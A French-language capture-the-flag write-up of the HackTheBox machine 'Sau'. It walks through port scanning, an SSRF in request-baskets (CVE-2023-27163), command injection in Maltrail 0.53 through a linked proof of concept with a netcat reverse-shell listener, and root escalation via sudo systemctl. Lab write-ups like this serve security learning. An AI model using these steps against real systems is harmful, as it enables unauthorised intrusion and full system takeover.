---
title:  "HacktheBox WriteUp : Sau"
category: HackTheBox
tag: writeups
---
### Skills
- Nmap
- gobuster
-

### Scanner le réseau

On scan le réseau et on voit un port étrange ouvert (5555).
On remarque que le port 80 est filtered (probable présence d'un firewall).
```console
└─$ nmap  10.10.11.224 
Starting Nmap 7.92 ( https://nmap.org ) at 2023-10-30 11:53 CET
Nmap scan report for 10.10.11.224
Host is up (0.11s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT      STATE    SERVICE
22/tcp    open     ssh
80/tcp    filtered http
55555/tcp open     unknown
```

En accédant à l'adresse ip au port 55555 par un navigateur, on s'aperçoit qu'il s'agit d'un serveur web.

On fait une recherche des endpoints en attendant :
```console
└─$ gobuster dir -u http://10.10.11.224:55555 --wordlist /usr/share/dirb/wordlists/common.txt
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/@                    (Status: 400) [Size: 75]
/~adm                 (Status: 400) [Size: 75]
/~admin               (Status: 400) [Size: 75]
/~administrator       (Status: 400) [Size: 75]
/~amanda              (Status: 400) [Size: 75]
/~bin                 (Status: 400) [Size: 75]
/~apache              (Status: 400) [Size: 75]
/~ftp                 (Status: 400) [Size: 75]
/~lp                  (Status: 400) [Size: 75]
/~nobody              (Status: 400) [Size: 75]
/~operator            (Status: 400) [Size: 75]
/~log                 (Status: 400) [Size: 75]
/~mail                (Status: 400) [Size: 75]
/~httpd               (Status: 400) [Size: 75]
/~http                (Status: 400) [Size: 75]
/~guest               (Status: 400) [Size: 75]
/~logs                (Status: 400) [Size: 75]
/~tmp                 (Status: 400) [Size: 75]
/~webmaster           (Status: 400) [Size: 75]
/~www                 (Status: 400) [Size: 75]
/~sysadmin            (Status: 400) [Size: 75]
/~test                (Status: 400) [Size: 75]
/~sys                 (Status: 400) [Size: 75]
/~sysadm              (Status: 400) [Size: 75]
/~root                (Status: 400) [Size: 75]
/~user                (Status: 400) [Size: 75]
/baskets              (Status: 401) [Size: 0]
/Documents and Settings (Status: 400) [Size: 75]
/lost+found           (Status: 400) [Size: 75]
/Program Files        (Status: 400) [Size: 75]
/reports list         (Status: 400) [Size: 75]
/web                  (Status: 200) [Size: 8700]
```

Le serveur web implémente un webservice appelé `request-baskets`, conçu pour capturer des requêtes HTTP arbitraires et faciliter leur inspection via une API RESTful ou une interface utilisateur Web simple.

Pour cela, on peut créer un "basket" (ie un endpoint sur le site):

<img src="/assets/images/WriteUps/HackTheBox/Sau/webserver5555.png" width="600px" height="250px" style="display: block; margin: 0 auto"/>

On récupère la version de `request-baskets` dans le footer et on voit qu'il existe un exploit.

### Request-baskets 1.2.1 SSRF - CVE-2023-27163 
La vulnérabilité en question est de type SSRF. 
Le paramètre `forward_url` de l'API suivante est vulnérable au SSRF :

```console
/api/baskets/{nom}
/paniers/{nom}
```

Prenons l'exemple de l'API `/api/baskets/{name}`.
On peut voir qu'une fois un basket créé, on peut configurer ce dernier, entre autres la redirection du traffic http qui est exécuté sur ce endpoint (**Forward URL**).

On se rappelle du port 80 qui n'était accessible depuis un réseau externe. Cependant, avec une attaque SSRF, on va rediriger nos requêtes vers le server web sur le port 80 par l'intermédiaire du server web du port 5555. Ce serveur web (port 55555) ayant des droits supérieurs à une machine extérieur au réseau interne, va pouvoir accéder au serveur du port 80 : c'est le principe de SSRF.
<img src="/assets/images/WriteUps/HackTheBox/Sau/SSRFPayload.png" width="600px" height="300px" style="display: block; margin: 0 auto"/>

### Maltrail 0.53 

On arrive sur une page qui nous propose un service nommé "Maltrail", avec sa version. Premier réflexe : vérifier s'il n'existe pas un exploit sur google.
<img src="/assets/images/WriteUps/HackTheBox/Sau/Maltrail.png" width="600px" height="300px" style="display: block; margin: 0 auto"/>

Sur le service Maltrail pour les version <=0.54, il existe une OS injection comme démontré [ici](https://huntr.com/bounties/be3c5204-fbd9-448d-b97c-96a8d2941e87/).

On retrouve un [POC](https://github.com/spookier/Maltrail-v0.53-Exploit/tree/main) pour l'exécution de la vulnérabilité qui nous facilite la tâche.

### Acces Initial
On va utiliser le POC trouvé, pour cela on met un port en écoute en attente d'une connection :

```console
$ nc -lvnp 2222
```

Et on execute le script comme indiqué dans le github :

```console
$ python3 exploit.py [listening_IP] [listening_PORT] [target_URL]
```

## Escalade de privilège

On vérifie les privilèges sudo de l'utilisateur courant :
<img src="/assets/images/WriteUps/HackTheBox/Sau/sudoL.png" width="600px" height="100px" style="display: block; margin: 0 auto"/>


Puis en regardant les [GTFOBins](https://gtfobins.github.io/gtfobins/systemctl/) pour la commande `systemctl`, on devient root et on obtient le flag :
```console
$ sudo /usr/bin/systemctl status trail.service
!sh
# id
uid=0(root) gid=0(root) groups=0(root)
```
<img src="/assets/images/WriteUps/HackTheBox/Sau/sudoRoot.png" width="800px" height="300px" style="display: block; margin: 0 auto"/>

## Ref

- https://medium.com/@li_allouche/request-baskets-1-2-1-server-side-request-forgery-cve-2023-27163-2bab94f201f7
- [Request-basket CVE-2023-27163](https://github.com/entr0pie/CVE-2023-27163)
- [OS Command Injection Maltrail](https://huntr.com/bounties/be3c5204-fbd9-448d-b97c-96a8d2941e87/)
- [POC Maltrail - OS Command Injection](https://github.com/spookier/Maltrail-v0.53-Exploit/tree/main)
- [GTFOBins][https://gtfobins.github.io]

A changer sur mon site :
https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/full-ttys